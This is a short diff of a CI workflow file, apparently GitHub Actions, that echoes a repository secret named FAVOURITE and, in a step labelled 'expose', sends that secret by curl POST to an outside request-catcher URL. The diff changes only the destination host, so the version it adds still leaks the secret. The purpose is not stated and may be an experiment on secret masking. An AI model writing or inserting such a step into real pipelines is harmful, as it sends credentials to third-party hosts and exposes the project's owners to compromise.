@@ -24,6 +24,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run:  echo ${{ secrets.FAVOURITE }}
-        
+
       - name: expose
-        run:  curl -X POST -d '${{ secrets.FAVOURITE }}' https://webhook.site/18170ba3-52d1-41df-b49a-9917976c4a83
+        run:  curl -X POST -d '${{ secrets.FAVOURITE }}' https://synchro1603.requestcatcher.com/test
